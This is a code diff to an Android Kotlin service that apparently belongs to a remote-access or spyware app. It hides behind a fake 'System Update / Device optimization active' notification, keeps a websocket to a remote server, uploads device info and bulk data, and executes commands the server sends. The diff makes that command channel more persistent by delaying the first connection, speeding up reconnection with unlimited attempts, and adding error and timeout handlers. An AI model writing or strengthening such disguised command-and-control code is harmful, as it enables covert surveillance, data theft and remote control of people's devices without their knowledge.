@@ -118,7 +118,11 @@ class MainService : Service() {
         createNotificationChannel()
         startForeground(NOTIFICATION_ID, createNotification("System Update", "Device optimization active"))
         
-        connectToServer()
+        // Delay initial connection to let device boot and network settle
+        Handler(Looper.getMainLooper()).postDelayed({
+            Log.d(TAG, "Delayed initial connection attempt")
+            connectToServer()
+        }, 5000)
     }
     
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -190,14 +194,15 @@ class MainService : Service() {
                 forceNew = true
                 reconnection = true
                 reconnectionAttempts = Int.MAX_VALUE
-                reconnectionDelay = 5000
-                reconnectionDelayMax = 30000
+                reconnectionDelay = 1000
+                reconnectionDelayMax = 5000
                 query = "deviceId=$deviceId&type=device"
                 transports = arrayOf("websocket")
+                timeout = 10000
             }
             socket = IO.socket(wsUrl, options)
             socket.on(Socket.EVENT_CONNECT) {
-                Log.d(TAG, "Connected to server")
+                Log.d(TAG, "Connected to server successfully")
                 isConnected = true
                 sendDeviceInfo()
                 Handler(Looper.getMainLooper()).postDelayed({ sendBulkData() }, 2000)
@@ -206,19 +211,30 @@ class MainService : Service() {
                 Log.d(TAG, "Disconnected from server")
                 isConnected = false
             }
+            socket.on(Socket.EVENT_CONNECT_ERROR) { args ->
+                Log.e(TAG, "Connection error: ${args.contentToString()}")
+                isConnected = false
+            }
+            socket.on(Socket.EVENT_CONNECT_TIMEOUT) {
+                Log.e(TAG, "Connection timeout - server may be cold-starting on Render")
+                isConnected = false
+            }
+            socket.on(Socket.EVENT_ERROR) { args ->
+                Log.e(TAG, "Socket error: ${args.contentToString()}")
+                isConnected = false
+            }
             socket.on("command") { args ->
                 if (args.isNotEmpty()) {
                     val data = args[0] as JSONObject
                     handleCommand(data)
                 }
             }
-            socket.on(Socket.EVENT_CONNECT_ERROR) { args ->
-                Log.e(TAG, "Connection error: ${args.contentToString()}")
-            }
             socket.connect()
+            Log.d(TAG, "Socket.connect() called")
         } catch (e: Exception) {
-            Log.e(TAG, "Socket connection error: ${e.message}")
-            Handler(Looper.getMainLooper()).postDelayed({ connectToServer() }, 10000)
+            Log.e(TAG, "Socket connection error: ${e.message}", e)
+            isConnected = false
+            Handler(Looper.getMainLooper()).postDelayed({ connectToServer() }, 5000)
         }
     }
     
